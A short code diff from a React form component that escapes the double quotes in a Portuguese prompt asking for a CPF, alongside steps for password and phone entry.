@@ -47,7 +47,7 @@ const Index = () => {
   const getStepTitle = () => {
     switch (step) {
       case 'cpf':
-        return "Informe seu CPF e clique em "Próximo" para continuar:";
+        return "Informe seu CPF e clique em \"Próximo\" para continuar:";
       case 'password':
         return "Digite sua senha para continuar:";
       case 'phone':
